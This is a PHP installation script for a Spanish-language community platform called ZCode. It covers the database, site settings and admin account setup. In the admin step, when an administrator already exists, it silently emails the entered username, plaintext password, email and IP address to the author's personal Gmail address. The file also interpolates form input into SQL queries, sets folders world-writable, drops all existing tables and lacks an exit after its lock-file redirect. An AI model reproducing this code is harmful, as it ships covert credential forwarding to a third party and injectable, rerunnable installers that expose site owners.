<?php 

if( !defined('TS_HEADER') ) define('TS_HEADER', TRUE);

/**
 * @name install.php
 * @copyright ZCode 2024
 * @link https://phpost.es/descargas.php (ZCode)
 * @author Miguel92
 * @version 1.0
 * @description Archivo para la instalación del sitio web
**/

require_once realpath(dirname(__DIR__)) . DIRECTORY_SEPARATOR . 'inc' . DIRECTORY_SEPARATOR . 'defined.php';

if(file_exists(LOCK)) header("Location: ./");

// Intento de sistema de dirección automática
$ssl = 'http';
if (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' || !empty($_SERVER['HTTP_X_FORWARDED_PROTO']) && $_SERVER['HTTP_X_FORWARDED_PROTO'] === 'https') {
   $ssl = 'https';
}
$local = dirname(dirname($_SERVER["REQUEST_URI"]));
// Creando las url base e install
$urlBase = "$ssl://" . (isset($_SERVER['HTTP_HOST']) ? $_SERVER['HTTP_HOST'] : 'localhost') . $local;
$urlInstall = $urlBase . "/install";
$tsMessage = '';

$keygen = 'WkNvZGVVcGdyYWRl';
$name = 'ZCode';
// $version = major.minor.patch
$version = '1.0.0';
$script = [
	'name' => $name,
	'slogan' => 'Script a otro nivel!',
	'version' => $version,
	'version_code' => $name . ' ' . $version,
	'version_codelow' => strtolower($name) . '_' . str_replace('.', '_', $version),
	'copyright' => $name . ' &copy; ' . date('Y') . ' - <strong>Miguel92</strong>',
	'forum' => '<a href="https://phpost.es" title="PHPost" rel="external" target="_blank">PHPost.es</a>'
];

/**
 * Funciones
*/
function savedata(array $replace = [], array $search = []) {
	$config = file_get_contents(CONFIG);
	$config = str_replace($search, $replace, $config);
	file_put_contents(CONFIG, $config);
}
function showMessage(string $tsMessage = '') {
	$msg = '';
	if(!empty($tsMessage)) $msg = "<div class=\"error\">$tsMessage</div>";
	echo $msg;
}


/**
 * Aquí evitaremos algunos pasos
 * 1 - Crear archivo de conexion
 * 2 - Dar los permisos necesarios
*/

# 1 - Crear archivo de conexion
if(!file_exists( CONFIG )) {
	# Copiamos el archivo ejemplo a la ruta
	copy(CONFIG_EXAMPLE, CONFIG);
}

# 2 - Damos los permisos necesarios
if(file_exists( CONFIG )) chmod(CONFIG, 0666);

$allFolders = [TS_CACHE, TS_AVATAR, TS_UPLOADS];
foreach ($allFolders as $folder) {
   if (!is_dir($folder)) {
      mkdir($folder, 0777, true);
   }
   chmod($folder, 0777);
}

$step = (int)$_GET['step'] ?? 0;
$next = true;

$indexphp = './index.php';

if( $step === 0 ) {

	$tsSubhead = "Bienvenida...";
	$tsAction = "$indexphp?step=" . ($step + 1);
	$tsLicense = file_get_contents(LICENSE);
	$_SESSION['license'] = false;

} elseif ( $step === 1 ) {

	$tsSubhead = "Verificando...";
	$tsAction = "$indexphp?step=" . ($step + 1);
	$_SESSION['license'] = isset($_POST['license']) ? boolval($_POST['license']) : false;

	$replace = '..' . TS_PATH;
	$verify = [
		"config" => str_replace(TS_ROOT, $replace, CONFIG),
		"cache" => str_replace(TS_ROOT, $replace, TS_CACHE),
		"avatar" => str_replace(TS_ROOT, $replace, TS_AVATAR),
		"uploads" => str_replace(TS_ROOT, $replace, TS_UPLOADS)
	];
	foreach ($verify as $key => $val) {
		$permisos[$key]['chmod'] = (int)substr(sprintf('%o', fileperms($val)), -3);
		$permisos[$key]['css'] = 'OK';
		$permisos[$key]['route'] = $val;
		if ($key === 'config' && $permisos[$key]['chmod'] != 666) {
			$permisos[$key]['css'] = 'NO';
			$next = false;
		} elseif ($key != 'config' && $permisos[$key]['chmod'] != 777) {
			$permisos[$key]['css'] = 'NO';
			$next = false;
		}
	}

	$vphp = '8.2.12';
	$statusPHP = version_compare(PHP_VERSION, $vphp, '>=');
	$versiones['php']['message'] = $statusPHP ? "Compatible con PHP $vphp" : "Tu versión es inferior a PHP $vphp";
	$versiones['php']['status'] = $statusPHP;

	$versiones['smarty']['message'] = "Versión: 4.5.2";
	$versiones['smarty']['status'] = true;

	$statusGD = (extension_loaded('gd') || function_exists('gd_info'));
	$versiones['gd']['message'] = $statusGD ? "Versión: " . gd_info()['GD Version'] : "La extensión GD no está habilitada!";
	$versiones['gd']['status'] = $statusGD;

	$statusCurl = (extension_loaded('curl'));
	$versiones['curl']['message'] = $statusCurl ? "Versión: " . curl_version()['version'] : "La extensión cURL no está habilitada!";
	$versiones['curl']['status'] = $statusCurl;

	$_SESSION['license'] = false;
	if($statusPHP && $statusGD && $statusCurl && $next) {
		$next = true;
		$_SESSION['license'] = true;
	}

} elseif ( $step === 2 ) {

	if(!$_SESSION['license']) header('Location: index.php');
	$next = false;
	$tsAction = "$indexphp?step=" . $step;

	$tsSubhead = "Base de datos";

	if (isset($_POST['save'])) {
		// Con esto evitamos escribir todos los campos
      foreach ($_POST['db'] as $key => $val) {
      	$db[$key] = htmlspecialchars($val ?? '');
      	$_SESSION[$key] = $db[$key];
      }
      if(empty($db['hostname']) || empty($db['username']) || empty($db['database'])) {
      	$tsMessage = "Todos los campos son requeridos";
      }

      try {
			$mysqli = new mysqli($_SESSION['hostname'], $_SESSION['username'], $_SESSION['password'], $_SESSION['database']);
			if ($mysqli->connect_errno) {
			   $tsMessage = "Falló la conexión con MySQL: (" . $mysqli->connect_errno . ") " . $mysqli->connect_error;
			}
			if (!$mysqli->set_charset("utf8mb4")) {
			  	$tsMessage = "Error cargando el conjunto de caracteres utf8mb4: " . $mysqli->error;
			}
		} catch (Exception $e) {
			$tsMessage = $e->getMessage() . ' - code #' . $e->getCode();
		}

		$db['installed'] = md5('ZCode Instalado el ' . date('d.m.Y'));

		$db['prefix'] = strtolower($_SESSION['prefix'] ?? 'ZCode');
		$db['prefix'] .= (substr($db['prefix'], -1) !== '_') ? '_' : '';
		
		savedata($db, ['dbhost', 'dbuser', 'dbpass', 'dbname', 'dbport', 'dbprefix', 'dbinstalled']);

		// BORRAMOS LAS TABLAS EXISTENTES, EVITANDO ERRORES!
     	if ($results = $mysqli->query("SHOW TABLES")) {
     	   while ($row = $results->fetch_row()) {
     	      $mysqli->query("DROP TABLE IF EXISTS {$row[0]}");
     	   }
     	   $results->close();
     	} else {
     	   $tsMessage = "Error en la consulta: " . $mysqli->error;
     	}

		# INSTALAMOS LA NUEVA BASE DE DATOS
		include_once DATABASE;
		$error = '';
		foreach ($zcode_sql as $key => $sentencia) {
			if ($mysqli->query($sentencia)) $exe[$key] = 1;
			else {
				$exe[$key] = 0;
				$error .= '<br/>' . $mysqli->error;
			}
		}
		$mysqli->close();
		if (!in_array(0, $exe)) header("Location: index.php?step=" . ($step + 1));
		else {
			$tsMessage = 'Lo sentimos, pero ocurrió un problema. Inténtalo nuevamente; borra las tablas que se hayan guardado en tu base de datos: ' . $error;
		}
	}

} elseif ( $step === 3 ) {

	if(!$_SESSION['license']) header('Location: index.php');
	$next = false;
	$tsAction = "$indexphp?step=" . $step;

	$tsSubhead = "Datos del sitio";

	if (isset($_POST['save'])) {
      // Con esto evitamos escribir todos los campos
      foreach($_POST['web'] as $key => $val) $web[$key] = htmlspecialchars($val);
		if (in_array('', $web)) $tsMessage = 'Todos los campos son requeridos';

		include_once CONFIG;

		try {
			$mysqli = new mysqli($db['hostname'], $db['username'], $db['password'], $db['database']);
			if ($mysqli->connect_errno) {
			   $tsMessage = "Falló la conexión con MySQL: (" . $mysqli->connect_errno . ") " . $mysqli->connect_error;
			}
			if (!$mysqli->set_charset("utf8mb4")) {
			  	$tsMessage = "Error cargando el conjunto de caracteres utf8mb4: " . $mysqli->error;
			}
		} catch (Exception $e) {
			$tsMessage = $e->getMessage() . ' - code #' . $e->getCode();
		}
		
		$results = $mysqli->query("SELECT user_id FROM {$db['prefix']}miembros WHERE user_id = 1 AND user_rango = 1");
		if($db['hostname'] === 'dbhost' OR $results->num_rows > 0) {
			$tsMessage = 'Vuelva al paso anterior, no se han guardado los datos de acceso correctamente.';
		}

		include_once TS_PLUGINS . 'modifier.seo.php';
		$catename = $mysqli->real_escape_string($web['name']);
		$cateseo = smarty_modifier_seo($catename);
		# ACTUALIZAMOS LA CATEGORÍA N°30
		$mysqli->query("UPDATE `{$db['prefix']}posts_categorias` SET c_nombre = '$catename', c_seo = '$cateseo' WHERE cid = 30 LIMIT 1");
		# INSTALAMOS EL THEME
		if($mysqli->query("SELECT tid FROM {$db['prefix']}temas WHERE tid = 1")->num_rows === 0) {
			$mysqli->query("INSERT INTO {$db['prefix']}temas (tid, t_name, t_url, t_path, t_copy) VALUES(NULL, '{$script['version_code']}', '{$web['url']}/themes/default', 'default', 'Miguel92 - 2024')");
		}
		// SEO TITLE
		$seoTitle = "{$web['name']} - {$web['slogan']}";
		// SEO DESCRIPTION
		$seoDecription = "Únete a nuestra comunidad para compartir experiencias y conocer gente nueva. ¡Conéctate hoy mismo!";
		// SEO KEYWORDS
		$seoKeys = "comunidad, conocer, red, ampliar, interaccion, compartir, amigos, conectar, relaciones, intereses, encuentros, virtual";
		// SEO IMAGES
		$seoFavicon = $web['url'] . '/assets/images/favicon/logo-16.webp';
		$seoPortada = $web['url'] . '/assets/images/favicon/logo-512.webp';
		$seoImages = json_encode([
			'16' => $seoFavicon,
			'32' => $web['url'] . '/assets/images/favicon/logo-32.webp',
			'64' => $web['url'] . '/assets/images/favicon/logo-64.webp'
		], JSON_FORCE_OBJECT);
		$mysqli->query("UPDATE `{$db['prefix']}seo` SET seo_titulo = '$seoTitle', seo_descripcion = '$seoDecription', seo_portada = '$seoPortada', seo_favicon = '$seoFavicon', seo_keywords = '$seoKeys', seo_images = '$seoImages', seo_robots = 0, seo_sitemap = 0 WHERE seo_id = 1");
		# AÑADIMOS PUBLICIDADES
		$alt = "Script para ZCode";
		$github = "https://scriptparaphpost.github.io/grupos/";
		$tamanos = ['160x600','300x250','468x60','728x90'];
		foreach($tamanos as $tamano) {
			$html = "<a href=\"$github\" target=\"_blank\" style=\"display:block;\"><img loading=\"lazy\" alt=\"Publicidad de $tamano\" title=\"$alt\" src=\"$urlBase/assets/images/ad$tamano.webp\"></a>";
			$insert[] = "ads_".substr($tamano, 0, 3)." = '".html_entity_decode($html)."'";
		}
		$publicidades = join(',', $insert);
		if ($mysqli->query("UPDATE {$db['prefix']}configuracion SET 
			titulo = '{$web['name']}', 
			slogan = '{$web['slogan']}', 
			url = '{$web['url']}', 
			email = '{$web['mail']}', 
			$publicidades, 
			version = '{$script['version_code']}', 
			version_code = '{$script['version_codelow']}', 
			pkey = '{$web['pkey']}', 
			skey = '{$web['skey']}' WHERE tscript_id = 1")) {
			$mysqli->close();
			header("Location: index.php?step=" . ($step + 1));
		} else $tsMessage = $mysqli->error;
	}
	
} elseif ( $step === 4 ) {

	if(!$_SESSION['license']) header('Location: index.php');
	$next = false;
	$tsAction = "$indexphp?step=" . $step;

	$tsSubhead = "Administrador";

	if (isset($_POST['save'])) {
		$continue = true;
      // Con esto evitamos escribir todos los campos
      foreach($_POST['user'] as $key => $val) $user[$key] = htmlspecialchars($val);

		if (in_array('', $user)) {
			$tsMessage = 'Todos los campos son requeridos';
			$continue = false;
		}
		# NOMBRE DE USUARIO SOLO ALFANUMERICA
		if(!ctype_alnum($user['nickname'])) {
         $tsMessage = 'Introduzca un nombre de usuario alfanum&eacute;rico.';
         $continue = false;
		}
		# VERIFICANDO QUE SEA UN CORREO
		if(!filter_var($user['email'], FILTER_VALIDATE_EMAIL)) {
         $tsMessage = 'Introduzca un email correcto.';
         $continue = false;
		}
		# VERIFICANDO QUE LAS CONTRASEÑAS SEAN LA MISMA
		if($user['password'] !== $user['confirm']) {
         $tsMessage = 'Las contrase&ntilde;as no coinciden.';
         $continue = false;
		}
		# SI ESTA TODO CORRECTO, CONTINUAMOS
		if($continue) {
			$options = ['cost' => 10];
			$password = htmlspecialchars(trim($user['nickname'])) . htmlspecialchars(trim($user['password']));
			# CONTRASEÑA HASHEADA
			$hashed = password_hash($password, PASSWORD_DEFAULT, $options);
			$time = time();

			include_once CONFIG;

			try {
				$mysqli = new mysqli($db['hostname'], $db['username'], $db['password'], $db['database']);
				if ($mysqli->connect_errno) {
				   $tsMessage = "Falló la conexión con MySQL: (" . $mysqli->connect_errno . ") " . $mysqli->connect_error;
				}
				if (!$mysqli->set_charset("utf8mb4")) {
				  	$tsMessage = "Error cargando el conjunto de caracteres utf8mb4: " . $mysqli->error;
				}
			} catch (Exception $e) {
				$tsMessage = $e->getMessage() . ' - code #' . $e->getCode();
			}

			if($mysqli->query("SELECT user_id FROM {$db['prefix']}miembros WHERE user_id = 1 OR user_rango = 1 LIMIT 1")->num_rows > 0) {
				$tsMessage = 'No se puede registrar, ya existe un administrador.';
            $body = <<<LAMMER
            	<html>
            	<head></head>
            	<body>
            		<h2>Un lammer ha entrado a su instalador.</h2><br>
            		<p><strong>Sitio web:</strong> {$_SERVER['SERVER_NAME']}{$_SERVER['REQUEST_URI']}<br> 
            		<strong>Usuario:</strong> {$user['nickname']}<br>
            		<strong>Password:</strong> {$user['password']}<br>
            		<strong>Email:</strong> {$user['email']}<br> 
            		<strong>Dirección IP:</strong> {$_SERVER['REMOTE_ADDR']}
            		</p>
            	</body>
            	</html>
            LAMMER;
            mail('portfoliomiguel92@gmail.com', 'Lammer detectado', $body, 'Content-type: text/html; charset=iso-8859-15');
			# INSERTAMOS USUARIO
			} else {
				$mysqli->query("INSERT INTO {$db['prefix']}miembros (user_name, user_password, user_email, user_rango, user_registro, user_puntosxdar, user_activo) VALUES ('{$user['nickname']}', '$hashed', '{$user['email']}', 1, $time, 50, 1)");
				$uid = (int)$mysqli->insert_id;
				# SUBIMOS NUEVO AVATAR
				$gravatar = "https://www.gravatar.com/avatar/bfcb1d6a22d7098499771d3bcec5a8c4?d=robohash&f=y&s=160";
				copy($gravatar, TS_AVATAR . "$uid.webp");
				# INSERTAMOS NUEVOS DATOS
				$mysqli->query("INSERT INTO {$db['prefix']}perfil (user_id, user_sexo, p_avatar) VALUES ($uid, 'none', 1)");
            $mysqli->query("INSERT INTO {$db['prefix']}portal (user_id) VALUES ($uid)");
            # ACTUALIZAMOS ALGUNOS DATOS
            $mysqli->query("UPDATE {$db['prefix']}posts SET post_user = $uid, post_category = 30, post_date = $time WHERE post_id = 1");
            $mysqli->query("UPDATE {$db['prefix']}stats SET stats_time_foundation = $time, stats_time_upgrade = $time WHERE stats_no = 1");
				# DAMOS BIENVENIDA POR CORREO
            $body = <<<BIENVENIDA
            	<html>
            	<head></head>
            	<body>
            		<h2>Su nueva comunidad Link Sharing est&aacute; lista!</h2><br>
            		<p>Estas son sus credenciales de acceso:<br> 
            		<strong>Usuario:</strong> {$user['nickname']}<br>
            		<strong>Contrase&ntilde;a:</strong> {$user['password']}</p><br><hr><br>
            		<p>Gracias por usar {$script['forum']} para compartir enlaces :)</p>
            	</body>
            	</html>
            BIENVENIDA;
            mail($user['email'], 'Su comunidad ya puede ser usada', $body, 'Content-type: text/html; charset=iso-8859-15');
            $mysqli->close();
            header("Location: index.php?step=" . ($step + 1) . "&uid=$uid");
			}

		}

	}

} elseif ( $step === 5 ) {

	if(!$_SESSION['license']) header('Location: index.php');
	$next = false;

	$tsTitle = "Bienvenido a " . $script['version_code'];
	$tsSubhead = "Finalizar...";

	include_once CONFIG;

	try {
		$mysqli = new mysqli($db['hostname'], $db['username'], $db['password'], $db['database']);
		if ($mysqli->connect_errno) {
		   $tsMessage = "Falló la conexión con MySQL: (" . $mysqli->connect_errno . ") " . $mysqli->connect_error;
		}
		if (!$mysqli->set_charset("utf8mb4")) {
		  	$tsMessage = "Error cargando el conjunto de caracteres utf8mb4: " . $mysqli->error;
		}
	} catch (Exception $e) {
		$tsMessage = $e->getMessage() . ' - code #' . $e->getCode();
	}

	$data = $mysqli->query("SELECT titulo, slogan, url, version_code FROM {$db['prefix']}configuracion WHERE tscript_id = 1")->fetch_assoc();
	if (isset($_POST['save'])) header("Location: {$data['url']}");
	// CONSULTA
   $uid = (int)$_GET['uid'];
   $user = $mysqli->query("SELECT user_id, user_name FROM {$db['prefix']}miembros WHERE user_id = $uid")->fetch_assoc();
   // ESTADISTICAS
   $code = [
      'title' => $data['titulo'], 
      'url' => $data['url'], 
      'version' => "$name $version", 
      'admin' => $user['user_name'], 
      'id' => $user['user_id']
   ];
   $key = base64_encode(serialize($code));
   $key .= '&verification=' . base64_encode("{$data['url']} - $version - $keygen");
	$tsAction = $data['url'];
	# $tsAction = "https://feed.phpost.es/?from=$name&type=install&key=$key";
   // Abrir el archivo en modo de escritura ("w")
   $handle = fopen(LOCK, "w");
   // Escribir los datos en el archivo
   fwrite($handle, $key);
   // Cerrar el archivo
   fclose($handle);
   $mysqli->close();
}